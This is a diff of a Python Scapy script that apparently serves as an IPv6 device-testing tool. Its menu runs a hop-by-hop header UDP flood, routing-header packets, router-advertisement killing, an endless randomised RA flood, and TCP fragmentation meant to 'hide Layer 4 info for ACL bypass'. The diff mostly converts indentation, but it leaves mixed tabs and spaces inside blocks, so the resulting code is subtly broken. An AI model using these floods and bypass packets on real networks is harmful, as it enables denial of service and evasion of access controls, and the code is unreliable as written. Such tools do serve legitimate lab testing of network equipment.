@@ -35,10 +35,10 @@ def randomacaddr():
 
 
 def hbh_flood(psrc = '::1', pdst = '::1', psport = 1055, pdport = 53, ppayload = 'x'*100, pnumpkts = 1000):
-    #Send defaults above unless entered by user
-    pkt = IPv6(src = psrc, dst = pdst)/IPv6ExtHdrHopByHop()/UDP(sport = psport, dport = pdport)/ppayload
-    pkt.show()
-    send(pkt, count = pnumpkts)
+	#Send defaults above unless entered by user
+	pkt = IPv6(src = psrc, dst = pdst)/IPv6ExtHdrHopByHop()/UDP(sport = psport, dport = pdport)/ppayload
+	pkt.show()
+	send(pkt, count = pnumpkts)
 
 
 def routing_header(router_address = '5::5', psrc = '::1', pdst = '::1', psport = 1055, pdport = 53, segleft=0, pnumpkts = 1000):
@@ -88,7 +88,7 @@ def kill_ra():
 	return()
 
 def flood_ra():
-	
+
 	pkt = Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix= RandIP6("2001:CAFE:*::"),prefixlen=64) \
 	/ICMPv6NDOptSrcLLAddr(lladdr=randomacaddr())
 	sendp(pkt,loop=1)
@@ -112,7 +112,7 @@ def tcp_fragment():
 	frag1=IPv6ExtHdrFragment(offset=0, m=1, id=511, nh=58)
 	frag2=IPv6ExtHdrFragment(offset=162, m=0, id=511, nh=6)	
 	### Create TCP Header
-	tcp=TCP()
+    tcp=TCP()
 	tcp.sport=1055
 	tcp.dport=8080
 	### Create Packet for sending
@@ -135,15 +135,15 @@ print('6. Hide Layer 4 Info for ACL Bypass')
 choice = raw_input('? ')
 
 if "1" in choice:
-	psrc = raw_input("Enter source IPv6 address: ")
-	pdst = raw_input("Enter destination IPv6 address.  Be sure that the destination is not the device under test.  The device under test \
-	has to be a layer 3 hop between the source and destination IPv6 address in order to test CPU impact: ")
-	psport = input("Enter source UDP port: ")
-	pdport = input("Enter destination UDP port: ")
-	pnumpkts = input("Enter number of packets: ")
-	
-	hbh_flood(psrc, pdst, psport, pdport, 'x*100', pnumpkts)
-	
+    psrc = raw_input("Enter source IPv6 address: ")
+    pdst = raw_input("Enter destination IPv6 address.  Be sure that the destination is not the device under test.  The device under test \
+    has to be a layer 3 hop between the source and destination IPv6 address in order to test CPU impact: ")
+    psport = input("Enter source UDP port: ")
+    pdport = input("Enter destination UDP port: ")
+    pnumpkts = input("Enter number of packets: ")
+
+    hbh_flood(psrc, pdst, psport, pdport, 'x*100', pnumpkts)
+
 if "2" in choice:
 	psrc = raw_input("Enter source IPv6 address: ")
 	print "Enter destination IPv6 address.  Be sure that the destination is not the device under test."
@@ -154,17 +154,16 @@ if "2" in choice:
 	print "Enter the number of segments left.  If Segments Left is zero the unit under test should ignore the RH and proceed to process the next header"
 	segleft = input("If the segments left is non-zero the unit under test should discard the RH and send an ICMP parameter program Code 0 to the source address")
 	pnumpkts = input("Enter number of packets: ")    	
-	routing_header(router_address, psrc, pdst, psport, pdport, segleft, pnumpkts) 
-
+    routing_header(router_address, psrc, pdst, psport, pdport, segleft, pnumpkts)
 
 if "3" in choice:
-    	multi_routing_header() 
+    multi_routing_header()
 
 if "4" in choice:
-	kill_ra()
+    kill_ra()
 
 if "5" in choice:
-	flood_ra()	
-	
+	flood_ra()
+
 if "6" in choice:
 	tcp_fragment()
